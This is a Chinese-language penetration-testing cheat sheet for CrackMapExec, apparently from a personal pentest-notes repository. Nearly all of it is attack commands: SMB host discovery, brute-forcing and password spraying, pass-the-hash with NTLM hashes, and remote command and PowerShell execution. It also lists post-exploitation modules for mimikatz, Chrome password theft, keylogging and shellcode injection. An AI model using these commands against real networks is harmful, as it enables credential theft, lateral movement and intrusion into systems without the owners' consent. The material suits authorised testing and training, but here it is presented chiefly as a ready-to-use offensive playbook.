  #### 信息收集
	返回活动主机
	>crackmapexec smb 192.168.0.0/24
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/252.png)
  #### 爆破
	支持协议ssh,smb,winrm,mssql,http
	爆破smb协议，两台机器，一个用户名多个密码
	>crackmapexec smb 192.168.0.98 192.168.0.55 -u username1 -p password1 password2
	>crackmapexec smb 192.168.0.0/24 -d zone.com -u y -p 'password' --shares
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/253.png)

	密码喷射
	>crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
	指定字典
	>crackmapexec <protocol> <target(s)> -u /tmp/user.txt -p /tmp/pass.txt
	Hash爆破
	>crackmapexec <protocol> <target(s)> -u /tmp/user.txt -H /tmp/ntlm.txt
  #### 可用模块
	日志的保存位置
	~/.cme/logs
	查看协议可用后续模块
	>crackmapexec smb -L
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/254.png)

	常用的模块
	Get-ComputerDetails获取计算机信息
	Bloodhound 执行一个BloodHound脚本获取信息
	empire_exec 与empire交互
	enum_avproducts 列举AV产品
	enum_chrome 获取目标chrome中保存的密码
	get_keystrokes 键盘记录
	get_netdomaincontroller 列出所有域控制器
	get_netrdpsession 列出活动的RDP会话
	gpp_autologin 从域控中registry.xml查找自动登录的账户密码
	gpp_password 组策略凭据中返回GPP密码
	invoke_sessiongopher 保存putty,winscp,filezilla,superputty rdp的session
	invoke_vnc 注入一个vnc客户端到内存
	met_inject 与msf交互
	mimikatz 调用mimikatz模块
	mimikatz_enum_chrome 使用mimikatz解密chrome保存的密码
	mimikatz_enum_vault_creds 解密windows凭据管理器中保存的密码
	mimikittenz 执行咪咪猫(windows密码获取软件)
	multirdp 允许多用户登录RDP
	netripper 通过API hooking截取平常
	pe_inject DLL/EXE注入
	rdp 开启或关闭RDP
	shellcode_inject 注入shellcode
	tokens 列举可用token
	uac 查看UAC是否开启
	wdigest 开启或关闭wdigest
	web_delivery 执行exploit/multi/script/web_delivery模块
	查看模块的选项
	>crackmapexec smb -M module --options
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/255.png)

	使用方式
	>crackmapexec smb <target(s)> -u user -p 'P@ssw0rd' -M module -o 参数=值
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/256.png)
  #### PTH
	>crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
	>crackmapexec smb <target(s)> -u username -H NTHASH
  #### 执行命令
	>crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -x 'command'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/257.png)

	-X执行powershell命令
	>crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -X 'POWESHELL'